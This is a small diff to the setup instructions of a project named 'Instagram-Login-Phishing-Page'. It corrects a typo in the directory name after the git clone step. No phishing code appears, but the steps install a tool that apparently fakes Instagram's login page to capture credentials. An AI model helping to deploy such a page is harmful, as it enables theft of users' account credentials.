@@ -31,7 +31,7 @@ Instagram-Login-Phishing-Page/
 
     ```sh
     git clone https://github.com/AbdullahMaqbool22/Instagram-Login-Phishing-Page.git
-    cd iInstagram-Login-Phishing-Page
+    cd Instagram-Login-Phishing-Page
     ```
 
 2. **Install dependencies:**
